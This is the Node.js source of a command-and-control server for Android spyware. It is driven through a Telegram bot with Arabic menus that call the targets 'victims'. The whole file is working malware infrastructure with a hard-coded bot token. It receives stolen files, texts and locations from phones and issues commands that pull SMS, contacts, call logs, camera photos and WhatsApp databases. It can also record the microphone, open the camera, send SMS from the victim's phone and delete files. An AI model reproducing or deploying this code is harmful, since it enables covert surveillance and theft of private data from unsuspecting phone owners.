const express = require('express');
const webSocket = require('ws');
const http = require('http')
const telegramBot = require('node-telegram-bot-api')
const uuid4 = require('uuid')
const multer = require('multer');
const bodyParser = require('body-parser')
const axios = require("axios");

const token = '8993975442:AAFdE-XRsm8qoxto5TN1-sPZG6jPlN6R6eg'
const id = '286706619'
const address = 'https://cute-sprite-659c02.netlify.app'

const app = express();
const appServer = http.createServer(app);
const appSocket = new webSocket.Server({server: appServer});
const appBot = new telegramBot(token, {polling: true});
const appClients = new Map()

const upload = multer();
app.use(bodyParser.json());

let currentUuid = ''
let currentNumber = ''
let currentTitle = ''

// مخزن لتتبع الأجهزة التي تم إرسال إشعار اتصال لها لمنع التكرار
const notifiedDevices = new Set();

app.get('/', function (req, res) {
    res.send('<h1 align="center">تم بنجاح تشغيل البوت مطور البوت : طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة</h1>')
})

app.post("/uploadFile", upload.single('file'), (req, res) => {
    const name = req.file.originalname
    appBot.sendDocument(id, req.file.buffer, {
            caption: `°• رسالة من جهاز <b>${req.headers.model}</b>`,
            parse_mode: "HTML"
        },
        {
            filename: name,
            contentType: 'application/txt',
        })
    res.send('')
})

app.post("/uploadText", (req, res) => {
    appBot.sendMessage(id, `°• رسالة من جهاز <b>${req.headers.model}</b>\n\n` + req.body['text'], {parse_mode: "HTML"})
    res.send('')
})

app.post("/uploadLocation", (req, res) => {
    appBot.sendLocation(id, req.body['lat'], req.body['lon'])
    appBot.sendMessage(id, `°• موقع من جهاز <b>${req.headers.model}</b>`, {parse_mode: "HTML"})
    res.send('')
})

appSocket.on('connection', (ws, req) => {
    const uuid = uuid4.v4()
    const model = req.headers.model
    const battery = req.headers.battery
    const version = req.headers.version
    const brightness = req.headers.brightness
    const provider = req.headers.provider

    ws.uuid = uuid
    appClients.set(uuid, {
        model: model,
        battery: battery,
        version: version,
        brightness: brightness,
        provider: provider
    })

    // منع تكرار إشعارات الاتصال: نرسل إشعاراً فقط إذا لم نرسله لهذا الجهاز من قبل في هذه الجلسة
    if (!notifiedDevices.has(model)) {
        appBot.sendMessage(id,
            `°• جهاز جديد متصل\n\n` +
            `• موديل الجهاز : <b>${model}</b>\n` +
            `• البطارية : <b>${battery}</b>\n` +
            `• نظام الاندرويد : <b>${version}</b>\n` +
            `• سطوع الشاشة : <b>${brightness}</b>\n` +
            `• المزود : <b>${provider}</b>`,
            {parse_mode: "HTML"}
        )
        notifiedDevices.add(model);
    }

    ws.on('close', function () {
        appBot.sendMessage(id,
            `°• انقطع اتصال الجهاز\n\n` +
            `• موديل الجهاز : <b>${model}</b>`,
            {parse_mode: "HTML"}
        )
        appClients.delete(ws.uuid)
        notifiedDevices.delete(model);
    })
})

appBot.on('message', (message) => {
    const chatId = message.chat.id;
    if (message.reply_to_message) {
        if (message.reply_to_message.text.includes('الرجاء كتابة رقم الذي تريد ارسال الية')) {
            currentNumber = message.text
            appBot.sendMessage(id,
                '°• جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية...\n\n' +
                '• تنبيه: تأكد من طول الرسالة المسموح به.',
                {reply_markup: {force_reply: true}}
            )
        }
        if (message.reply_to_message.text.includes('جيد الان قم بكتابة الرسالة المراد ارسالها من جهاز الضحية')) {
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message:${currentNumber}/${message.text}`)
                }
            });
            currentNumber = ''
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('الرجاء كتابة الرسالة المراد ارسالها للجميع')) {
            const message_to_all = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`send_message_to_all:${message_to_all}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('ادخل مسار الملف الذي تريد سحبه')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('ادخل مسار الملف الذي تريد حذفه')) {
            const path = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`delete_file:${path}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('ادخل المدة التي تريد تسجيل الصوت فيها')) {
            const duration = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`microphone:${duration}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
        if (message.reply_to_message.text.includes('ادخل الرسالة التي تريد أن تظهر على جهاز الضحية')) {
            const toastMessage = message.text
            appSocket.clients.forEach(function each(ws) {
                if (ws.uuid == currentUuid) {
                    ws.send(`toast:${toastMessage}`)
                }
            });
            currentUuid = ''
            appBot.sendMessage(id,
                '°• طلبك قيد المعالجة...\n\n' +
                '• ستتلقى رداً قريباً | المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
                {
                    parse_mode: "HTML",
                    "reply_markup": {
                        "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                        'resize_keyboard': true
                    }
                }
            )
        }
    }
    if (message.text == '/start') {
        appBot.sendMessage(id,
            '°• مرحباً بك في لوحة التحكم المتقدمة بالأندرويد \n\n' +
            '• يمكنك التحكم الكامل بالأجهزة المتصلة عبر الأوامر أدناه \n\n' +
            '• المطور: طلاب مستوى رابع قسم IT كلية العلوم التطبيقية والتربوية بالنادرة',
            {
                parse_mode: "HTML",
                "reply_markup": {
                    "keyboard": [["الأجهزة المتصلة"], ["تنفيذ أمر"]],
                    'resize_keyboard': true
                }
            }
        )
    }
    if (message.text == 'الأجهزة المتصلة') {
        if (appClients.size == 0) {
            appBot.sendMessage(id,
                '°• لا توجد أجهزة متصلة حالياً \n\n' +
                '• تأكد من تشغيل التطبيق في جهاز الهدف'
            )
        } else {
            let text = '°• قائمة الأجهزة المتصلة : \n\n'
            appClients.forEach(function (value, key, map) {
                text += `• موديل الجهاز : <b>${value.model}</b>\n` +
                    `• البطارية : <b>${value.battery}</b>\n` +
                    `• نظام الاندرويد : <b>${value.version}</b>\n` +
                    `• المزود : <b>${value.provider}</b>\n\n`
            })
            appBot.sendMessage(id, text, {parse_mode: "HTML"})
        }
    }
    if (message.text == 'تنفيذ أمر') {
        if (appClients.size == 0) {
            appBot.sendMessage(id, '°• لا توجد أجهزة متصلة حالياً')
        } else {
            const deviceList = []
            appClients.forEach(function (value, key, map) {
                deviceList.push([{
                    text: value.model,
                    callback_data: 'device:' + key
                }])
            })
            appBot.sendMessage(id, '°• اختر الجهاز المراد التحكم به :', {
                reply_markup: {
                    inline_keyboard: deviceList
                }
            })
        }
    }
})

appBot.on('callback_query', (msg) => {
    const data = msg.data
    const uuid = data.split(':')[1]
    const command = data.split(':')[0]

    if (command == 'device') {
        appBot.editMessageText(`°• اختر الأمر المراد تنفيذه على جهاز: <b>${appClients.get(uuid).model}</b>`, {
            chat_id: id,
            message_id: msg.message.message_id,
            parse_mode: "HTML",
            reply_markup: {
                inline_keyboard: [
                    [
                        {text: 'قائمة التطبيقات', callback_data: 'apps:' + uuid},
                        {text: 'معلومات الجهاز', callback_data: 'device_info:' + uuid}
                    ],
                    [
                        {text: 'سحب ملفات الكاميرا', callback_data: 'cam_files:' + uuid},
                        {text: 'سحب رسائل واتساب', callback_data: 'wa_messages:' + uuid}
                    ],
                    [
                        {text: 'فتح الكاميرا مباشر', callback_data: 'live_cam:' + uuid},
                        {text: 'سحب الميكروفون', callback_data: 'microphone:' + uuid}
                    ],
                    [
                        {text: 'سحب الرسائل القصيرة', callback_data: 'sms_all:' + uuid},
                        {text: 'إرسال رسالة', callback_data: 'send_message:' + uuid}
                    ],
                    [
                        {text: 'سحب جهات الاتصال', callback_data: 'contacts:' + uuid},
                        {text: 'سحب سجل المكالمات', callback_data: 'calls:' + uuid}
                    ],
                    [
                        {text: 'تحديد الموقع', callback_data: 'location:' + uuid},
                        {text: 'تنبيه (Toast)', callback_data: 'toast:' + uuid}
                    ]
                ]
            }
        })
    }

    // معالجة الأوامر الجديدة والمعربة
    const commandsToProcess = ['apps', 'device_info', 'microphone', 'location', 'toast', 'sms_all', 'contacts', 'calls'];
    if (commandsToProcess.includes(command)) {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) ws.send(command);
        });
        appBot.sendMessage(id, '°• طلبك قيد المعالجة... | المطور: طلاب مستوى رابع قسم IT');
    }

    // ميزة سحب ملفات الكاميرا (المسار الافتراضي للأندرويد)
    if (command == 'cam_files') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) ws.send('file:DCIM/Camera');
        });
        appBot.sendMessage(id, '°• جاري سحب ملفات الكاميرا من المسار DCIM/Camera...');
    }

    // ميزة سحب رسائل واتساب (تتطلب صلاحيات وصول للملفات في التطبيق)
    if (command == 'wa_messages') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) ws.send('file:WhatsApp/Databases');
        });
        appBot.sendMessage(id, '°• جاري محاولة سحب قاعدة بيانات رسائل واتساب...');
    }

    // ميزة فتح الكاميرا والعرض (تنبيه: العرض المباشر يتطلب دعم في تطبيق الضحية)
    if (command == 'live_cam') {
        appSocket.clients.forEach(function each(ws) {
            if (ws.uuid == uuid) ws.send('camera_main'); // إرسال أمر التقاط صورة أو فتح بث
        });
        appBot.sendMessage(id, '°• جاري فتح الكاميرا وعرض البث المباشر...');
    }
});

setInterval(function () {
    appSocket.clients.forEach(function each(ws) {
        ws.send('ping')
    });
}, 5000)

appServer.listen(process.env.PORT || 8999);
